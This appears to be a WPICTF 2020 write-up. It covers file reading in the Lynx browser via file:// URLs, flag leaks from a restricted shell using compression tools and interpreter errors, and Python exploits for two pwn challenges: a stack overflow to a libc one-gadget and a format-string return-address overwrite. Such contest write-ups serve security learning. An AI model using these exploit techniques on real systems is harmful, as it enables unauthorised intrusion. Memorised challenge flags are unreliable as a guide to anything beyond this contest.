# WPICTF 2020 

> Sat, 18 April 2020, 05:00 CST — Mon, 20 April 2020, 05:00 CST

# Linux

## LynxVE (50pt)

### Description

> `ssh ctf@lynxve.wpictf.xyz` 
>
> pass: `lynxVE` 
>
> made by: acurless

### Analysis

> [Lynx](https://lynx.invisible-island.net/) is a text Web-Browser 

We can visit local files in this browser by `file://` protocol:

```bash
file://localhost/etc/fstab
file:///etc/fstab
```

> Examples from [wikipedia](https://en.wikipedia.org/wiki/File_URI_scheme#Unix)

### Solution

Type `G` and input URL=`file:///` to visit local files:

![](http://image.taqini.space/img/20200419021852.png)

Finally we can find `flag` in folder `/home/ctf/` and then read it:

![](http://image.taqini.space/img/20200419021518.png)

> WPI{lynX_13_Gr8or_Th@n_Chr0m1Um}



## Suckmore Shell 2.0 (200pt)

### Description

> After its abysmal performance at WPICTF  2019, suckmore shell v1 has been replaced with a more secure, innovative and performant version, aptly named suckmore shell V2. 
>
> `ssh smsh@smsh.wpictf.xyz` pass: `suckmore>suckless` 
>
> made by: acurless

### Solution

Here are some kinds of cmd can use to leak content of files:

* file viewer (`more`)
* compress/decompress cmd (`xz`, `tar`, `bzip2`)
* Language interpreter/assembler (`perl`, `as` )

#### File viewer

Use `more` command to view flag directly:
```bash
> more flag
echo "WPI{SUckmoreSoftwareN33dz2G3TitTogeTHER}"
```

#### Compress/decompress

Some cmd (with or without options) can print content of file during compress/decompress process

```bash
> xz flag
�7zXZ�ִF!t/�/echo "WPI{SUckmoreSoftwareN33dz2G3TitTogeTHER}"
�r����`�H0�@�>��}YZ> ls
```

```bash
> tar cvf a.tar flag
flag
> tar xvf a.tar
flag
echo "WPI{SUckmoreSoftwareN33dz2G3TitTogeTHER}"
```

```bash
> bzip2 flag
> bzip2 -c -d flag.bz2
echo "WPI{SUckmoreSoftwareN33dz2G3TitTogeTHER}"
```

#### Language interpreter/assembler

Error information of language interpreter/assembler may print the content of files:

```bash
> perl flag
String found where operator expected at flag line 1, near "echo "WPI{SUckmoreSoftwareN33dz2G3TitTogeTHER}""
    (Do you need to predeclare echo?)
syntax error at flag line 1, near "echo "WPI{SUckmoreSoftwareN33dz2G3TitTogeTHER}""
Execution of flag aborted due to compilation errors.
```

```bash
> as flag
flag: Assembler messages:
flag:1: Error: no such instruction: `echo "WPI{SUckmoreSoftwareN33dz2G3TitTogeTHER}"'
```



# Pwn

## dorsia1 (100pt)

### Description

> http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The first card. 
>
> nc  dorsia1.wpictf.xyz 31337 or 31338 or 31339 
>
> made by: awg 
>
> Hint: Same libc as dorsia4, but you shouldn't need the file to solve.


### Attachment

[dorsia1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WPICTF2020/pwn/dorsia1/dorsia1) (not given, I download it after getshell)

### Analysis

We can get source code of this challenge from the first card:

![](http://image.taqini.space/img/cap_dorsia_00:00:06_01.jpg) 

`system+765772` is the address of one gadget in `libc2.27`, and there is a buffer overflow in stack. So we can overwrite the return address with address of one gadget.

### Solution

We can't get the precise offset between buffer `a` and return address, but we know the approximate range. So try it:

```python
for i in range(4,20):
    p = remote('dorsia1.wpictf.xyz',31338)
    og = eval(p.recv(14))
    print 'og',hex(og)
    p.recv()
    offset = 69+i
    payload = 'A'*offset
    payload += p64(og)
    print "[+] ",i
    print payload
    p.sendline(payload)
    p.interactive()
```

> final offset is 77

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/WPICTF2020/pwn/dorsia1) 



## dorsia3 (250pt)

### Description

> http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The third card. 
>
> nc dorsia3.wpictf.xyz 31337 or 31338 or 31339 
>
> made by: awg

### Attachment

[nanoprint](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WPICTF2020/pwn/nanoprint/nanoprint), [libc](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WPICTF2020/pwn/nanoprint/libc.so.6)

### Analysis

The third card:

![](http://image.taqini.space/img/cap_dorsia_00:00:53_02.jpg)

`system-288` is an address of `one gadget` in libc and `a` is a buffer in stack. There is a format string vulnerability and we can use it to modify return address to the address of `one gadget`.

### Solution

very common fmtstr attack:

```python
stack = eval(p.recv(10))
system = eval(p.recv(10))
info_addr('stack',stack)
info_addr('system',system)
ret = stack+0x71
info_addr('ret',ret)

payload = '%%%dc%%14$hn'%((system)&0xffff) +'%%%dc%%15$hn'%((((system>>16)-(system))%0x10000)&0xffff)
payload = payload.ljust(29,'B')
payload += p32(ret) + p32(ret+2)

sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/WPICTF2020/pwn/nanoprint) 

